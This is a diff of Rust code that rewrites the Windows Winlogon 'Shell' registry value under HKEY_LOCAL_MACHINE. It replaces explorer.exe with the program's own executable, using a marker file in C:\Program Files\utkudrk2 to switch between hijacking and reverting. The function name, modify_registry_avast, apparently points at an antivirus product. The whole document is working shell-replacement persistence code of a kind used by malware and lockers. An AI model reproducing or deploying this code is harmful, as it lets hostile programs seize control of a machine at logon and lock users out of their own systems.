@@ -152,8 +152,9 @@ fn modify_registry() -> io::Result<()> {
 }
 
 fn modify_registry_avast() -> io::Result<()> {
-    // Get the current executable path
-    let current_exe_path = env::current_exe()?;
+    // Define the path to the directory and the marker file
+    let dir_path = r"C:\Program Files\utkudrk2";
+    let txt_file_path = Path::new(dir_path).join("execution_marker.txt");
 
     // Open the registry key for Winlogon
     let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
@@ -162,29 +163,49 @@ fn modify_registry_avast() -> io::Result<()> {
         KEY_SET_VALUE,
     )?;
 
-    // If the system is in safe mode, revert changes and set "Shell" back to explorer.exe
-    if !is_in_safe_mode() {
+    // Check if the marker file exists
+    if txt_file_path.exists() {
+        // File exists, revert registry changes and set "Shell" back to explorer.exe
+        println!("Execution marker found. Reverting registry changes.");
+
         // Delete the existing "Shell" value if it exists
         match winlogon_key.delete_value("Shell") {
-            Ok(_) => println!("Existing Shell value deleted (safe mode)."),
-            Err(e) => eprintln!("Failed to delete Shell value (safe mode): {}", e),
+            Ok(_) => println!("Existing Shell value deleted (reverting)."),
+            Err(e) => eprintln!("Failed to delete Shell value (reverting): {}", e),
         }
 
         // Set the "Shell" value back to explorer.exe
         winlogon_key.set_value("Shell", &OsString::from("explorer.exe"))?;
-        println!("Registry reverted: Shell set to explorer.exe (safe mode).");
-    } else {
-        // If not in safe mode, set the "Shell" value to the current executable path
-        // Delete the existing "Shell" value if it exists
-        match winlogon_key.delete_value("Shell") {
-            Ok(_) => println!("Existing Shell value deleted (normal mode)."),
-            Err(e) => eprintln!("Failed to delete Shell value (normal mode): {}", e),
-        }
+        println!("Registry reverted: Shell set to explorer.exe");
 
-        // Convert the path to a String and set the new "Shell" value
-        winlogon_key.set_value("Shell", &current_exe_path.to_string_lossy().to_string())?;
-        println!("Registry modified: Shell set to {:?}", current_exe_path);
+        // Optionally, delete the marker file after reverting
+        fs::remove_file(txt_file_path)?;
+
+        return Ok(());
     }
+
+    // Ensure the directory exists
+    if !Path::new(dir_path).exists() {
+        println!("Directory does not exist. Creating: {}", dir_path);
+        fs::create_dir_all(dir_path)?;
+    }
+
+    // Create the .txt file to mark this execution
+    let mut file = fs::File::create(txt_file_path)?;
+    writeln!(file, "Execution marker")?;
+
+    // Get the current executable path
+    let current_exe_path = env::current_exe()?;
+
+    // Delete the existing "Shell" value if it exists
+    match winlogon_key.delete_value("Shell") {
+        Ok(_) => println!("Existing Shell value deleted."),
+        Err(e) => eprintln!("Failed to delete Shell value: {}", e),
+    }
+
+    // Convert the path to a String and set the new "Shell" value
+    winlogon_key.set_value("Shell", &current_exe_path.to_string_lossy().to_string())?;
+    println!("Registry modified: Shell set to {:?}", current_exe_path);
 
     Ok(())
 }
